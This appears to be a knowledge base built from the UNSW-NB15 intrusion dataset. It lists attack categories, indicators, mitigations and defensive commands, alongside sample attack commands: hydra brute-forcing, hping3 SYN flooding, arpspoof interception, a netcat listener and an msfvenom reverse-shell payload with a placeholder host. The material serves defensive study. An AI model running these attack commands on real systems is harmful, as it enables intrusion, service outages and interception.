Normal.description: Legitimate network traffic with normal behavioral patterns.

Generic.description: Generic attack technique not fitting a specific category — often brute-force or protocol abuse.
mitigations: IDS rules for unusual flag patterns

Exploits.description: Attacks exploiting known software vulnerabilities (CVEs) for remote code execution or privilege escalation.
indicators: Large spike in bytes sent to service

Fuzzers.description: Automated input fuzzing to discover vulnerabilities by sending malformed or random data.

DoS.description: Denial of Service attacks that overwhelm target resources to cause unavailability.
defense_commands: netstat -n | awk '/SYN_RECV/ {print $5}' | cut -d: -f1 | sort | uniq -c | sort -n

Reconnaissance.description: Information-gathering phase: scanning, enumeration, and fingerprinting of targets before attack.

Analysis.description: Traffic analysis and protocol inspection attacks — often MITM or passive interception.

Backdoor.description: Persistent unauthorized access mechanism installed post-exploitation to maintain foothold.

Shellcode.description: Machine-code payloads injected into vulnerable processes to execute arbitrary commands.

Worms.description: Self-propagating malware that spreads across networks by exploiting vulnerabilities autonomously.

=== CYBERSECURITY KNOWLEDGE BASE (from UNSW-NB15 Dataset) ===
Dataset: UNSW-NB15 Network Intrusion Detection Dataset | Records: 257,673

ATTACK CATEGORIES (real network traffic analysis):
  • Normal: 93,000 samples (36.09%)
  • Generic: 58,871 samples (22.85%)
  • Exploits: 44,525 samples (17.28%)
  • Fuzzers: 24,246 samples (9.41%)
  • DoS: 16,353 samples (6.35%)
  • Reconnaissance: 13,987 samples (5.43%)
  • Analysis: 2,677 samples (1.04%)
  • Backdoor: 2,329 samples (0.9%)
  • Shellcode: 1,511 samples (0.59%)
  • Worms: 174 samples (0.07%)

ATTACK DESCRIPTIONS, INDICATORS & COMMANDS:

[GENERIC]
  Description: Generic attack technique not fitting a specific category — often brute-force or protocol abuse.
  Indicators: High packet rates, Unusual flag combinations, Repeated connection attempts
  Attack commands: nmap -sS <target> | hydra -l admin -P passwords.txt <target>
  Defense commands: iptables -A INPUT -m limit --limit 10/min -j ACCEPT | fail2ban-client status
  Mitigations: Rate limiting, IP blocklisting, IDS rules for unusual flag patterns

[EXPLOITS]
  Description: Attacks exploiting known software vulnerabilities (CVEs) for remote code execution or privilege escalation.
  Indicators: Unexpected payloads in traffic, Connections to unusual ports, Large spike in bytes sent to service
  Attack commands: msfconsole | searchsploit <service>
  Defense commands: dpkg -l | grep <package> | apt-get update && apt-get upgrade
  Mitigations: Patch management, WAF deployment, Service version hardening

[FUZZERS]
  Description: Automated input fuzzing to discover vulnerabilities by sending malformed or random data.
  Indicators: High volume of malformed requests, Elevated error rates, Connection resets
  Attack commands: wfuzz -c -z file,wordlist.txt http://target/FUZZ | ffuf -w wordlist.txt -u http://target/FUZZ
  Defense commands: grep '400\|500' /var/log/apache2/access.log | wc -l | fail2ban-client status
  Mitigations: Input validation, Web application firewall, Error handling hardening

[DOS]
  Description: Denial of Service attacks that overwhelm target resources to cause unavailability.
  Indicators: Sudden traffic spike, High SYN packet rate, Server CPU at 100%, Connection timeouts
  Attack commands: hping3 -S --flood -V -p 80 <target> | slowhttptest -c 500 -H -g -o test -i 10 -r 200 -t GET -u http://target
  Defense commands: netstat -n | awk '/SYN_RECV/ {print $5}' | cut -d: -f1 | sort | uniq -c | sort -n | iptables -A INPUT -p tcp --syn -m limit --limit 1/s -j ACCEPT
  Mitigations: SYN cookies, Rate limiting, CDN/DDoS protection, ISP-level filtering

[RECONNAISSANCE]
  Description: Information-gathering phase: scanning, enumeration, and fingerprinting of targets before attack.
  Indicators: Port scan patterns, Multiple probes from same IP, DNS enumeration bursts
  Attack commands: nmap -sV -p- <target> | nmap -O <target>
  Defense commands: nmap -sn 192.168.1.0/24 | tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0'
  Mitigations: IDS/IPS with scan detection, Honeypots, Rate-limiting probes, Firewall logging

[ANALYSIS]
  Description: Traffic analysis and protocol inspection attacks — often MITM or passive interception.
  Indicators: ARP spoofing, Unusual ICMP traffic, Protocol anomalies
  Attack commands: tcpdump -i eth0 -w capture.pcap | arpspoof -i eth0 -t <victim> <gateway>
  Defense commands: arp -n | arping -I eth0 <gateway>
  Mitigations: Encrypted communications (TLS), Static ARP entries, Network segmentation

[BACKDOOR]
  Description: Persistent unauthorized access mechanism installed post-exploitation to maintain foothold.
  Indicators: Unusual outbound connections, New cron jobs or services, Modified system binaries
  Attack commands: netcat -lvp 4444 | meterpreter > run persistence
  Defense commands: find / -mtime -1 -type f 2>/dev/null | netstat -tulpn | grep LISTEN
  Mitigations: File integrity monitoring, Endpoint detection, Network egress filtering

[SHELLCODE]
  Description: Machine-code payloads injected into vulnerable processes to execute arbitrary commands.
  Indicators: NOP sled patterns in traffic, Unusual memory addresses in payloads, Buffer overflow patterns
  Attack commands: msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f elf
  Defense commands: cat /proc/sys/kernel/randomize_va_space | checksec --file=./binary
  Mitigations: ASLR/DEP/NX bit enabled, Stack canaries, Seccomp filters

[WORMS]
  Description: Self-propagating malware that spreads across networks by exploiting vulnerabilities autonomously.
  Indicators: Network broadcast storms, High outbound connection rate, Unexpected port 445/139 activity
  Attack commands: nmap -p 445 192.168.1.0/24 --open
  Defense commands: iptables -A INPUT -p tcp --dport 445 -j DROP | smb client list
  Mitigations: Network segmentation, Patch SMB vulnerabilities, Host-based firewalls

=== END KNOWLEDGE BASE ===
